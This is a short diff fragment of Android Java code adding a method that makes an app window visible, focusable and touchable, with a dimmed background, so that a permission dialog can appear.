+    private void makeFocusable() {
+        try {
+            Window window = getWindow();
+            android.view.WindowManager.LayoutParams params = window.getAttributes();
+            
+            // For permissions, we MUST have some visibility and focus
+            // Alpha 0.01 is invisible to eye but visible to system
+            params.alpha = 1.0f; // Temporarily visible for permission dialog
+            params.dimAmount = 0.5f; // Dim background to focus attention
+            
+            // CLEAR all pass-through flags so we can receive input/focus for the dialog
+            params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
+            params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+            params.flags &= ~android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+            
+            // Add flag to ensure dialogs appear above
+            params.flags |= android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND;
+            
+            window.setAttributes(params);
+            window.getDecorView().setVisibility(View.VISIBLE);
+            window.getDecorView().bringToFront();
+            
+            Log.d(TAG, "Made window focusable/visible for permissions");
+        } catch (Exception e) {
+            Log.e(TAG, "Error making window focusable", e);
+        }
     }
 }
